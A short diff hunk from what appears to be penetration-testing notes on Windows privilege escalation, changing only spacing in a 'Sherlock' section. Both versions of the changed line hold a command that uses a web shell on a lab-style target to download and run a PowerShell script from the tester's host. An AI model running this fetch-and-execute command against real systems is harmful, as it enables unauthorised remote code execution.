@@ -13,7 +13,7 @@ The output shows either public exploits (E), or Metasploit modules (M) as indica
 ## Sherlock
 
 ```
-view-source:10.10.10.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
+view-source:10.10.10.X/shell.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
 ```
 
 ## Basic Enumeration of the System
